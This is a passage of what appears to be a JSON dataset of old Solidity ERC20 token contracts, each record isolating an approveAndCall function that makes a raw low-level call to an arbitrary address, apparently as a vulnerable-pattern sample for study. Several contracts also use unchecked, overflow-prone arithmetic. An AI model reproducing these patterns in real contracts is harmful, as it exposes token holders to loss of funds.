    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15ab"
  },
  "filename": "35318.sol",
  "content": "pragma solidity ^0.4.4;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\ncontract Token is SafeMath {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = safeSub(balances[msg.sender],_value);\n balances[_to] = safeAdd(balances[_to],_value);\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] =safeAdd(balances[_to],_value);\n balances[_from] =safeSub(balances[_from],_value);\n allowed[_from][msg.sender] = safeSub(allowed[_from][msg.sender],_value);\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply= 4500000*10**12;\n uint256 public initialSupply= 2500000*10**12;\n}\ncontract HawalaToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'HAT';\n function HawalaToken(\n ) {\n totalSupply+=initialSupply;\n balances[msg.sender] = initialSupply;\n name = \"HawalaToken\";\n decimals = 12;\n symbol = \"HAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15ac"
  },
  "filename": "35328.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"WIINK Coin\";\n decimals = 0;\n symbol = \"WNK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15ad"
  },
  "filename": "35334.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SouthAfriCash is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SouthAfriCash(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"SouthAfriCash\";\n decimals = 18;\n symbol = \"ZAC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15ae"
  },
  "filename": "35349.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FlintsChodeCoins is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function FlintsChodeCoins(\n ) {\n balances[msg.sender] = 10000;\n totalSupply = 10000;\n name = \"Flint's Chode Coins\";\n decimals = 0;\n symbol = \"FCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15af"
  },
  "filename": "35359.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MDPTestToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MDPTestToken(\n ) {\n balances[msg.sender] = 660000000000000;\n totalSupply = 660000000000000;\n name = \"MDP Token\";\n decimals = 7;\n symbol = \"MDP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b0"
  },
  "filename": "35365.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BolivarToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BolivarToken(\n ) {\n balances[msg.sender] = 100000000000000000;\n totalSupply = 100000000000000000;\n name = \"Bolivar Token\";\n decimals = 8;\n symbol = \"BOLT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b1"
  },
  "filename": "35372.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract QToken is HumanStandardToken {\n mapping (address => bool) authorisers;\n address creator;\n bool canPay = true;\n function QToken() HumanStandardToken(0, \"Q\", 18, \"QTQ\") public{\n creator = msg.sender;\n }\n modifier ifCreator(){\n if(creator != msg.sender){\n revert();\n }\n _;\n }\n modifier ifAuthorised(){\n if(authorisers[msg.sender] || creator == msg.sender){\n _;\n }\n else{\n revert();\n }\n }\n modifier ifCanPay(){\n if(!canPay){\n revert();\n }\n _;\n }\n event Authorise(bytes16 _message, address indexed _actioner, address indexed _actionee);\n function authorise(address _address) public ifAuthorised{\n authorisers[_address] = true;\n Authorise('Added', msg.sender, _address);\n }\n function unauthorise(address _address) public ifAuthorised{\n delete authorisers[_address];\n Authorise('Removed', msg.sender, _address);\n }\n function replaceAuthorised(address _toReplace, address _new) public ifAuthorised{\n delete authorisers[_toReplace];\n Authorise('Removed', msg.sender, _toReplace);\n authorisers[_new] = true;\n Authorise('Added', msg.sender, _new);\n }\n function isAuthorised(address _address) public constant returns(bool){\n return authorisers[_address] || (creator == _address);\n }\n function pay(address _address, uint256 _value) public ifCanPay ifAuthorised{\n balances[_address] += _value;\n totalSupply += _value;\n Transfer(address(this), _address, _value);\n }\n function killPay() public ifCreator{\n canPay = false;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b2"
  },
  "filename": "35385.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MDPToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MDPToken(\n ) {\n balances[msg.sender] = 660000000000000;\n totalSupply = 660000000000000;\n name = \"MDP Token\";\n decimals = 7;\n symbol = \"MDP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b3"
  },
  "filename": "35403.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ClubEth is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ClubEth(\n ) {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"ClubEth\";\n decimals = 2;\n symbol = \"CLBE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b4"
  },
  "filename": "35415.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Valens is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Valens(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Valens\";\n decimals = 0;\n symbol = \"VLN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b5"
  },
  "filename": "35444.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n 